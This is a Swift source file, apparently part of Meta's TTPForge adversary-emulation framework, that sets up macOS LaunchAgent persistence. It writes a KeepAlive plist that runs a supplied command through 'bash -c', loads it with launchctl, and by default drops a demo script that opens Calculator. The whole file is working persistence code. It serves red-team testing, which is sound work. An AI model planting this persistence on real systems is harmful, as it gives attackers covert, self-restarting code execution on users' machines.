// @nolint
/*
 Copyright © 2023-present, Meta Platforms, Inc. and affiliates
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in
 all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
*/

import Foundation

print("This TTP will create LaunchAgent persistence to call a provided shell script.")

// Check if we have the necessary argument
guard CommandLine.arguments.count > 1 else {
    print("[!] Missing parameters. Usage: programName <path>")
    exit(1)
}

var retString = ""

let fileMan = FileManager.default
let username = NSUserName()
print(" ===> Attempting to drop LaunchAgent persistence...")

// Get the command_or_path from the command line argument
guard CommandLine.arguments.count > 1 else {
    print("[!] Error: Missing command or path argument.")
    exit(1)
}

let commandOrPath = CommandLine.arguments[1]
print("[*] Command or Path: \(commandOrPath)")

if commandOrPath == "/Users/Shared/calc.sh" {
    let script = """
    #!/bin/bash
    open -a Calculator.app
    """

    let script2 = Data(script.utf8)
    fileMan.createFile(atPath: commandOrPath, contents: script2, attributes: nil)

    var attributes = [FileAttributeKey: Any]()
    attributes[.posixPermissions] = 0o755
    do {
        try fileMan.setAttributes(attributes, ofItemAtPath: commandOrPath)
        print("[*] Shell script created and attributes set.")
    } catch {
        print("[!] Error setting the shell script attributes: \(error)")
    }
}

let plist = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.ttpforgelaunchagent.plist</string>
    <key>ProgramArguments</key>
    <array>
        <string>bash</string>
        <string>-c</string>
        <string>\(commandOrPath)</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

var isDir = ObjCBool(true)
let plist2 = Data(plist.utf8)
let plistPath = "/Users/\(username)/Library/LaunchAgents/com.ttpforgelaunchagent.plist"

if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents", isDirectory: &isDir) {
    print("/Users/\(username)/Library/LaunchAgents directory is already present, so writing plist...")
} else {
    print("/Users/\(username)/Library/LaunchAgents directory is not present, so creating that directory...")
    do {
        try fileMan.createDirectory(at: URL(fileURLWithPath: "/Users/\(username)/Library/LaunchAgents"), withIntermediateDirectories: false)
        print("[*] Directory created.")
    } catch {
        print("[!] Error creating directory: \(error)")
        exit(1)  // exit if directory couldn't be created
    }
}

fileMan.createFile(atPath: plistPath, contents: plist2, attributes: nil)
if fileMan.fileExists(atPath: plistPath) {
    print("[*] Plist successfully written to \(plistPath)")
} else {
    print("[!] Plist wasn't written for some reason.")
}

let proc = Process()
proc.launchPath = "/bin/launchctl"
let args: [String] = ["load", "-w", "/Users/\(username)/Library/LaunchAgents/com.ttpforgelaunchagent.plist"]
proc.arguments = args

let outputPipe = Pipe()
let errorPipe = Pipe()
proc.standardOutput = outputPipe
proc.standardError = errorPipe
proc.launch()
proc.waitUntilExit()

// Capture standard output
let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
if let outputString = String(data: outputData, encoding: .utf8), !outputString.isEmpty {
    print("[*] Launchctl standard output: \(outputString)")
}

// Capture standard error
let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
if let errorString = String(data: errorData, encoding: .utf8), !errorString.isEmpty {
    print("[!] Launchctl standard error: \(errorString)")
}

if proc.terminationStatus == 0 {
    print("[*] Launchctl executed successfully.")
} else {
    print("[!] Error with launchctl. Termination status: \(proc.terminationStatus)")
}

if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents/com.ttpforgelaunchagent.plist") {
    retString = "[+] Successfully loaded com.ttpforgelaunchagent.plist"
    print(retString)
} else {
    retString = "[!] This TTP failed to execute. Launch Agent not created"
    print(retString)
}
